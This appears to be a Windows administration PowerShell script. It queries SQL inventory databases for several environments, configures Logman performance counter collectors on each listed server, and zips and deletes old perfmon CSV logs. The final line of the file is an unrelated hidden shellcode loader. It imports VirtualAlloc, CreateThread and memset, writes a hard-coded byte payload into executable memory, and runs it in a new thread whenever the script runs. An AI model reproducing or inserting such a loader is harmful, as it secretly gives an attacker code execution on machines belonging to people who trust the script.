  





  
 


function SQL-Query{
	param([string]$Query,
	[string]$SqlServer = $DEFAULT_SQL_SERVER,
	[string]$DB = $DEFAULT_SQL_DB,
	[string]$RecordSeparator = "`t")

	$conn_options = ("Data Source=$SqlServer; Initial Catalog=$DB;" + "Integrated Security=SSPI")
	$conn = New-Object System.Data.SqlClient.SqlConnection($conn_options)
	$conn.Open()

	$sqlCmd = New-Object System.Data.SqlClient.SqlCommand
	$sqlCmd.CommandTimeout = "300"
	$sqlCmd.CommandText = $Query
	$sqlCmd.Connection = $conn

	$reader = $sqlCmd.ExecuteReader()
	if(-not $?) {
	$lineno = Get-CurrentLineNumber
	./logerror.ps1  $Output $date $lineno $title 
	}
	[array]$serverArray
	$arrayCount = 0
	while($reader.Read()){
		$serverArray += ,($reader.GetValue(0))
		$arrayCount++
	}
	$serverArray
}
   
function SQL-NONQuery{
	param([string]$Statement,
	[string]$SqlServer = $DEFAULT_SQL_SERVER,
	[string]$DB = $DEFAULT_SQL_DB )

	$conn_options = ("Data Source=$SqlServer; Initial Catalog=$DB;" + "Integrated Security=SSPI")
	$conn = New-Object System.Data.SqlClient.SqlConnection($conn_options)
	$conn.Open()

	$cmd = $conn.CreateCommand()
	$cmd.CommandText = $Statement
	$Server = $cmd.ExecuteNonQuery()
	if(-not $?) {

	$lineno = Get-CurrentLineNumber
	
	./logerror.ps1  $Output $date $lineno $title
	}
	$Server
}

function Txt-extract{
	param([string]$txtName)
	$returnArray = Get-Content $txtname
	return $returnArray
}
 
function Get-CurrentLineNumber { 
	$lineno = $MyInvocation.ScriptLineNumber 
	$lineno = $lineno -2
	$lineno
}






$ENV = $args[0]

if ($ENV -eq $null){
    $ENV = "PROD"
    }
    
switch ($ENV) 
	{
	"PA-PROD"{ 	$DBServer 		= 	"XSQLUTIL18"; 
				$ArchiveDrive	=	"E"
				$DB 			= 	"Status"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'App'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'
									ORDER BY server_name
									"; 
    		}
	
	"PA-STAGE"{ $DBServer 		= 	"FINREP01V"; 
				$ArchiveDrive	=	"E"
				$DB 			= 	"Status"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'App'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'
									ORDER BY server_name
									"; 
    		}
	
	"PA-IMP"{ 	$DBServer 		= 	"ISQLDEV610"; 
				$ArchiveDrive	=	"E"
				$DB 			= 	"StatusStage"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'App'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'
									ORDER BY server_name
									"; 
    		}
	
	"PA-QA"{ 	$DBServer 		= 	"ISQLDEV610"; 
				$ArchiveDrive	=	"E"
				$DB 			= 	"StatusIMP"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'App'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'
									ORDER BY server_name
									"; 
    		}
			
	"DEN-PROD"{ $DBServer 		= 	"SQLUTIL01"; 
				$ArchiveDrive	=	"D"
				$DB 			= 	"Status"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'OpusApp'
												WHEN 'Opus Doc' THEN 'OpusDoc'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'
									--AND dns_host_name LIKE 'sql01.generation%'
									--AND server_name LIKE 'SQLUTIL%'
									--OR server_name LIKE 'HOpusSQL%'
									ORDER BY server_name
									";
			}
	
	"LOU-PROD"{ $DBServer 		= 	"SQLUTIL02"; 
				$ArchiveDrive	=	"D"
				$DB 			= 	"Status"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'OpusApp'
												WHEN 'Opus Doc' THEN 'OpusDoc'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'
									--AND server_name LIKE 'SQLUTIL%'
									--OR server_name LIKE 'HOpusCap%'
									ORDER BY server_name
									";  
			}
	
	"FINALE"{ $DBServer 		= 	"FINREP01V"; 
				$ArchiveDrive	=	"C"
				$DB 			= 	"Status"; 
				$ServerQuery	= 	"SELECT server_name
										, [Type] = 
											CASE st.type_name
												WHEN 'BOS-IIS' THEN 'IIS'
												WHEN 'Web-IIS' THEN 'IIS'
												WHEN 'Citrix PVS' THEN 'PVS'
												WHEN 'Citrix XenApp' THEN 'XenApp'
												WHEN 'Opus App' THEN 'OpusApp'
												WHEN 'Opus Doc' THEN 'OpusDoc'
												WHEN 'SQL' THEN 'SQL'
												ELSE 'Standard'
											END
										, domain
										, ip_address
										, dns_host_name
										, perfmon_path
										, perfmon_drive
										, perfmon_start_time
										, perfmon_end_time
									FROM t_server s 
										INNER JOIN t_server_properties sp ON s.server_id = sp.server_id
										INNER JOIN t_perfmon_properties pp ON s.server_id = pp.server_id
										INNER JOIN t_server_type_assoc sta ON s.server_id = sta.server_id
										INNER JOIN t_server_type st ON sta.type_id = st.type_id
									WHERE Active = '1'"; 
    		}
	}

$d = (get-date).toshortdatestring()
$d = $d -replace "`/","-"

$OperationsSharename = "Operations"
$PerfmonLogsShareName = "PerfmonLogsArchive"
$title = "PerfmonCollector"

$Servers = ( Invoke-SQLCmd -query $ServerQuery -Server $DBServer -Database $DB )

$l = $Servers.length
$i = 0

$ArchiveIPQuery = "SELECT ip_address FROM t_server_properties where server_id = (select server_id from t_server where server_name = '$DBServer')"		
$ArchiveIP = ( Invoke-SQLCmd -query $ArchiveIPQuery -Server $DBServer -Database $DB | Select-Object ip_address)
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().name

foreach ($Server in $Servers) 
{
	if ($Server -ne $null) 
	{
        
		$ServerName 			= 	$($Server.dns_host_name)	
		$ServerIPAddress		= 	$($Server.ip_address)
		$ServerType 			= 	$($Server.Type)
		$PerfmonDrive			= 	$($Server.perfmon_drive)
		
		$PerfmonLogsArchive		= 	"\\" + $DBServer + "\" + $ArchiveDrive + "$\" + $PerfmonLogsShareName
		$ArchiveDir 			= 	"\\" + $ArchiveIP.ip_address + "\" + $PerfmonLogsShareName + "\" + $ServerName + "\"
		$LogDir 				= 	"\\" + $ArchiveIP.ip_address + "\" + $OperationsSharename + "\logs"
		$Output 				= 	$LogDir + "\PerfmonCollectorLog_$d.txt"

		$PerfmonLogPath 		= 	"\\" + $ServerIPAddress + "\" + $OperationsSharename + "\support\perfmon\"
		$PerfmonLogLocalPath 	= 	$PerfmonDrive + ":\" + $OperationsSharename + "\support\perfmon\"
		$PerfmonCounterList		= 	$ArchiveDrive + ":\" + $OperationsSharename + "\Support\" + $ServerType + "Counters.txt"
		
		Write-Host "----- Begin $ServerName. -----"

		$i++
		Write-Progress -Activity "Stopping Previous SystemHealth Data Collectors..." -Status "Completed: $i of $l Server: $ServerName"
		$StrCMDstop = "C:\Windows\System32\Logman.exe stop SystemHealth -s $ServerName"
		Invoke-Expression $StrCMDstop 
		Write-Progress -Activity "Creating SystemHealth Data Collectors..." -Status "Completed: $i of $l Server: $ServerName"
		$StrCMDcreate = "C:\Windows\System32\Logman.exe create counter SystemHealth -s $ServerName -cf $PerfmonCounterList -si 60 -f csv -v mmddhhmm -o $PerfmonLogLocalPath\$ServerName.csv -b 00:01:00 -e 23:59:00 -y"
		Invoke-Expression $StrCMDcreate 
		Write-Progress -Activity "Starting SystemHealth Data Collectors..." -Status "Completed: $i of $l Server: $ServerName"
		$StrCMDstart = "C:\Windows\System32\Logman.exe start SystemHealth -s $ServerName"       
		Invoke-Expression $StrCMDstart          

            
            if (test-path $PerfmonLogPath) {
				
                If (test-path "ENV:PROGRAMFILES") {
                    $ProgramDir = $ENV:PROGRAMFILES
            		}
				elseif (test-path "ENV:PROGRAMFILES(X86)") {
                	
					$ProgramDir = get-content "env:Programfiles(x86)"
					}
                if (-not (test-path "$ProgramDir\7-Zip\7z.exe")) {throw "$ProgramDir\7-Zip\7z.exe needed"}
                    set-alias sz "$ProgramDir\7-Zip\7z.exe" 
                    foreach ($file in Get-ChildItem -path $PerfmonLogPath "*.csv" | Where-Object {!($_.psiscontainer)}) {
                        Write-Host $file
                        
						if ($file.CreationTime -lt ($(Get-Date).AddHours(-1))) {
                        
                            if (!(Test-Path -path $ArchiveDir)) {
								New-Item $ArchiveDir -type directory
                                }
                            $name = $file.name
                            $name = $name.trim()
                            write-host "Source file: $name"
                            $zipPath = "$ArchiveDir\$name.zip"
                            $FullPath = $PerfmonLogPath + $name 
 
                             sz a -tzip "$ZipPath" "$FullPath" | find "Everything is Ok" 
                             $zipResult = $?
                             write-host "Archive Success: $zipResult"
                             if ($zipResult -match "True") {
                                write-host "Archive operation successful - deleting source file: $FullPath"
                                add-content $output "Archive operation successful - deleting source file: $FullPath"
                                Remove-Item $FullPath 
                                }
							else{
                                write-host "Archive Failure - $FullPath. Local file retained"
                                add-content $output "Archive Failure - $FullPath. Log file not deleted."
                                }
                            } 
                    	}
               }
		Write-Host "----- End $ServerName. -----"
		Write-Host ""
	}
}


$MnxY = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $MnxY -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x5b,0x6d,0x83,0x54,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x54,0x8f,0x76,0xa8,0x82,0xcd,0x79,0x51,0x52,0xb2,0xf0,0xb4,0x63,0xf2,0x67,0xbc,0xd3,0xc2,0xec,0x90,0xdf,0xa9,0xa1,0x00,0x54,0xdf,0x6d,0x26,0xdd,0x6a,0x48,0x09,0xde,0xc7,0xa8,0x08,0x5c,0x1a,0xfd,0xea,0x5d,0xd5,0xf0,0xeb,0x9a,0x08,0xf8,0xbe,0x73,0x46,0xaf,0x2e,0xf0,0x12,0x6c,0xc4,0x4a,0xb2,0xf4,0x39,0x1a,0xb5,0xd5,0xef,0x11,0xec,0xf5,0x0e,0xf6,0x84,0xbf,0x08,0x1b,0xa0,0x76,0xa2,0xef,0x5e,0x89,0x62,0x3e,0x9e,0x26,0x4b,0x8f,0x6d,0x36,0x8b,0x37,0x8e,0x4d,0xe5,0x44,0x33,0x56,0x32,0x37,0xef,0xd3,0xa1,0x9f,0x64,0x43,0x0e,0x1e,0xa8,0x12,0xc5,0x2c,0x05,0x50,0x81,0x30,0x98,0xb5,0xb9,0x4c,0x11,0x38,0x6e,0xc5,0x61,0x1f,0xaa,0x8e,0x32,0x3e,0xeb,0x6a,0x94,0x3f,0xeb,0xd5,0x49,0x9a,0x67,0xfb,0x9e,0x97,0x25,0x93,0x53,0x9a,0xd5,0x63,0xfc,0xad,0xa6,0x51,0xa3,0x05,0x21,0xd9,0x2c,0x80,0xb6,0x1e,0x07,0x74,0x28,0xe1,0xa8,0x85,0x60,0x25,0xfc,0xd5,0x1a,0x8c,0x7d,0xbe,0xda,0x31,0xa8,0x2b,0xde,0xa5,0xc4,0xb4,0xd8,0x3f,0x83,0xc6,0x18,0x3e,0xe8,0x4e,0xfe,0x10,0x5e,0x01,0xaf,0xd0,0x0e,0xe1,0x1f,0xb8,0x44,0xee,0x40,0xd8,0x66,0x24,0xe9,0x72,0x89,0x91,0x41,0xea,0x30,0xb8,0x1a,0x8b,0xbd,0x16,0x67,0x8b,0x36,0x95,0x97,0x45,0xbf,0xd0,0x8b,0x31,0x4f,0xaf,0xf6,0x97,0x50,0x05,0x9c,0x17,0xc5,0xa2,0x37,0x40,0x71,0xa9,0x6e,0xa6,0xde,0x52,0x45,0xbd,0xd7,0xc6,0x26,0xa9,0x17,0x07,0xa7,0x29,0x4e,0x4d,0xa7,0x41,0x36,0x35,0xf4,0x74,0x39,0xe0,0x68,0x25,0xac,0x0b,0xd9,0x9a,0x67,0x64,0xe7,0xc5,0x40,0x2b,0x18,0x20,0x51,0x17,0xcf,0x0c,0x27,0x79,0xd3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cqR=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cqR.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cqR,0,0,0);for (;;){Start-sleep 60};

